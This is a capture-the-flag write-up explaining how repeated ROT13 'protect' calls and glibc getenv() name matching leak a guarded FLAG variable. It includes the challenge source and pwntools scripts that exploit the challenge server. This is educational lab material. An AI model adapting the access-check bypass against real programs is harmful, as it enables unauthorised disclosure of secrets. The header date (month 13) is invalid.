---
title: "FortiD CTF 2025 – protect-the-environment: Abusing getenv() with repeated ROT13"
date: 2025-13-11
toc: true
---

> *Protect the earth? We can't even protect our environment variables...*

### TL;DR

Repeatedly calling `protect FLAG` adds `+13` to each byte of the FLAG **value**. After 19 applications the first byte of the value becomes `'='`, turning the stored string into `FLAG==...`. Then `print FLAG=` matches that entry and returns the encoded payload. Recover the original flag by adding `+9` to each returned byte (i.e. `original = (encoded + 9) % 256`).
### What the program does

```c
// gcc -o chall chall.c

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void rot13(char *s) {
  while (*s != 0) {
    *s += 13;
    s++;
  }
}

int main(void) {
  setbuf(stdin, NULL);
  setbuf(stdout, NULL);

  char command[64];
  char name[64];

  while (1) {
    printf("> ");
    scanf("%63s %63s", command, name);
    if (!strcmp(command, "protect")) {
      char *val = getenv(name);
      if (val) {
        rot13(val);
        printf("Protected %s\n", name);
      } else {
        printf("No such environment variable\n");
      }
    } else if (!strcmp(command, "print")) {
      if (!strcmp(name, "FLAG")) {
        printf("Access denied\n");
      } else {
        char *val = getenv(name);
        if (val) {
          printf("%s=%s\n", name, val);
        } else {
          printf("No such environment variable\n");
        }
      }
    } else {
      printf("Unknown command\n");
      break ;
    }
  } 
  return 0;
}
```

The source code doesn't appear to be exploitable: it simply protects the environment values using [rot13](https://en.wikipedia.org/wiki/ROT13) prints environment variables (except the flag) using `getenv()`. 
### Exploitation

I was honestly stunned for a long time — the binary looked clean and I couldn't find any vuln in the code — so I decided to f**k with my brain and dive into the `getenv()` source code.
#### getenv() mistreating entries

Reading the glibc `getenv()` [implementation](https://elixir.bootlin.com/glibc/glibc-2.27/source/stdlib/getenv.c) we see that `getenv()` scans the environment array (`environ` / `start_environ`) line by line, looking for an entry of the form `NAME=VALUE`. When it finds a matching name it returns a pointer to the value (the characters immediately after the `=`).

```c
size_t len = strlen (name);
for (char **ep = start_environ; ; ++ep)
{
    char *entry = atomic_load_relaxed (ep);
    if (entry == NULL)
    break;

    /* If there is a match, return that value.  It was valid at
        one point, so we can return it.  */
    if (name[0] == entry[0]
        && strncmp (name, entry, len) == 0 && entry[len] == '=')
    return entry + len + 1;
}
```

So if we can turn the first byte of the **value** into an `'='` byte, the stored environment string becomes `NAME==...` (note the double `=`). If we then call `print NAME=` (notice the extra `=` included in the name we pass to the program) the `getenv()` call will look for an entry named `NAME=` and check that `entry[len] == '='` — that second `=` is the one we created at the start of the value. `getenv()` therefore returns a pointer to the data _after_ the second `=` — i.e. the original value with its first byte removed (so you can now read the encoded payload).

##### How many times do we need to call `protect`?

Each `protect` call adds `13` to every byte of the value (mod 256). If the value's first byte is `x`, after `k` calls it becomes `(x + 13*k) % 256`. We want that first byte to become `=` (ASCII 61).

```
(x + 13*k) % 256 == 61
=> 13*k ≡ (61 - x) (mod 256)
```

As the flag starts with `'F'` (70), we need `13*k ≡ 61 - 70 ≡ -9 ≡ 247 (mod 256)`. Since `13 * 19 = 247`, `k = 19` is the solution — so 19 `protect` calls will make the first byte of the value `=`.

We can confirm this by using the following poc:

```python
from pwn import *

p = remote('0.cloud.chals.io', 33121)

for _ in range(19):
    p.sendlineafter(b"> ", b"protect FLAG")

p.interactive()
```

![](https://github.com/user-attachments/assets/e4bfbe96-0011-4d8f-83b3-3dedd596ac31)

#### printf FLAG=

```python
from pwn import *
p = remote('0.cloud.chals.io', 33121)

for _ in range(19):
  p.sendlineafter(b"> ", b"protect FLAG")

p.sendlineafter(b"> ", b"print FLAG=")
p.recvuntil(b"FLAG=")
log.success(''.join(chr((ord(c)+9)%256) for c in p.recvline().strip().decode()))
```

![](https://github.com/user-attachments/assets/21ca19d3-0cdd-4f89-baa5-a890500d4166)

### Conclusion

Make the flag wear an extra `=` — print it out, add 9, and boom, flag unlocked.
